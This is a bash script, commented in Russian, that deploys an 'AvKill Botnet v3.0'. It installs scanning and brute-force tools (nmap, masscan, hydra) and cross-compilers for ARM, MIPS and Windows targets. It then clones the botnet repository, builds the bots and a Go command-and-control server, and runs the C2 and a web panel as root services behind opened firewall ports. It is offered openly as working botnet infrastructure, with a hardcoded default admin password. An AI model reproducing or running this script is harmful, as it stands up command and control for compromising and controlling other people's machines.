#!/bin/bash
# scripts/deploy.sh

echo "[+] Deploying AvKill Botnet v3.0"
echo "[+] Author: @kwavka"
echo "[+] Project: https://t.me/+x7wZtZ23I5pkMjQy"

# Проверка root
if [ "$EUID" -ne 0 ]; then 
    echo "[-] Please run as root"
    exit 1
fi

# Обновление системы
echo "[+] Updating system..."
apt-get update -y
apt-get upgrade -y

# Установка зависимостей
echo "[+] Installing dependencies..."
apt-get install -y \
    gcc g++ make golang-go php php-sqlite3 \
    python3 python3-pip git curl wget \
    nmap masscan hydra sqlite3 \
    libssl-dev libssh2-1-dev \
    upx-ucl

# Установка кросс-компиляторов
echo "[+] Installing cross-compilers..."
apt-get install -y \
    gcc-multilib g++-multilib \
    arm-linux-gnueabi-gcc \
    arm-linux-gnueabihf-gcc \
    mips-linux-gnu-gcc \
    mipsel-linux-gnu-gcc \
    mingw-w64

# Клонирование проекта
echo "[+] Cloning project..."
cd /opt
git clone https://github.com/kwavka/avkill-botnet.git
cd avkill-botnet

# Сборка ботов
echo "[+] Building bots..."
cd bot
make build_all
cd ..

# Компиляция C2 сервера
echo "[+] Building C2 server..."
cd c2_server
go mod init avkill-c2
go mod tidy
go build -o c2_server -ldflags="-s -w" main.go
cd ..

# Настройка веб-панели
echo "[+] Setting up web panel..."
chmod 777 web_panel/
cp web_panel/config.example.php web_panel/config.php

# Настройка баз данных
echo "[+] Setting up databases..."
sqlite3 c2_server/c2.db ".read c2_server/schema.sql"
sqlite3 web_panel/users.db ".read web_panel/schema.sql"

# Создание служб
echo "[+] Creating services..."

# C2 сервис
cat > /etc/systemd/system/avkill-c2.service << EOF
[Unit]
Description=AvKill C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/avkill-botnet/c2_server
ExecStart=/opt/avkill-botnet/c2_server/c2_server
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# Веб панель
cat > /etc/systemd/system/avkill-web.service << EOF
[Unit]
Description=AvKill Web Panel
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/opt/avkill-botnet/web_panel
ExecStart=/usr/bin/php -S 0.0.0.0:8080
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# Запуск служб
echo "[+] Starting services..."
systemctl daemon-reload
systemctl enable avkill-c2 avkill-web
systemctl start avkill-c2 avkill-web

# Настройка фаервола
echo "[+] Configuring firewall..."
ufw allow 1337/tcp  # C2 порт
ufw allow 8080/tcp  # Веб панель
ufw allow 443/tcp   # SSL
ufw --force enable

# Создание скрипта обновления
cat > /usr/local/bin/avkill-update << EOF
#!/bin/bash
cd /opt/avkill-botnet
git pull
cd bot && make clean && make build_all
cd ../c2_server && go build -o c2_server
systemctl restart avkill-c2 avkill-web
echo "[+] AvKill updated!"
EOF

chmod +x /usr/local/bin/avkill-update

echo ""
echo "================================================"
echo "[+] AvKill Botnet успешно установлен!"
echo ""
echo "[+] C2 Server:    http://$(curl -s ifconfig.me):1337"
echo "[+] Web Panel:    http://$(curl -s ifconfig.me):8080"
echo "[+] Default login: admin / avkill2024"
echo ""
echo "[+] Команды:"
echo "    systemctl status avkill-c2    # Статус C2"
echo "    systemctl status avkill-web   # Статус веб-панели"
echo "    avkill-update                 # Обновление"
echo "================================================"